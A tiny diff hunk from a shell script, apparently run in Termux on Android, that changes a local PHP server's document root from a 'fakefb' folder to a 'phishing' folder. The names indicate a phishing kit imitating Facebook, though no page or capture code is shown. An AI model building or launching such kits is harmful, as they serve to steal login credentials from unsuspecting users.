@@ -49,4 +49,4 @@ case $lk in
 esac
 
 
-php -S localhost:8091 -t /data/data/com.termux/files/home/fakefb;
+php -S localhost:8091 -t /data/data/com.termux/files/home/phishing;
